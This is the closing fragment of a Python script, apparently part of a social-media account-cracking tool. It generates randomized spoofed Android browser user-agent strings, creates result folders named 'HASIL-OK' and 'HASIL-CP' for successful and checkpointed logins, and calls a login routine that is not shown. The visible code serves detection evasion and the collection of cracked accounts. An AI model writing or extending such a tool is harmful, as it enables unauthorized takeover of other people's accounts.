				f"Mozilla/5.0 (Linux; U; Android {andro}; {bhasa}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom}{rc([f' Quark/{str(rr(1,6))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,999))}',f' UCBrowser/{str(rr(1,19))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,1299))}',f' MQQBrowser/{str(rr(4,10))}.{str(rr(0,9))}'])} Mobile Safari/537.36",
				f"Mozilla/5.0 (Linux; U; Android {andro}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom} Mobile Safari/537.36 OPR/{str(rr(10,83))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}"]);ugen2.append(uaku)
### ------- [ Systemm Contol ] ------- ###
if __name__=="__main__":
	try:os.mkdir('HASIL-OK')
	except:pass
	try:os.mkdir('HASIL-CP')
	except:pass
	Lgine()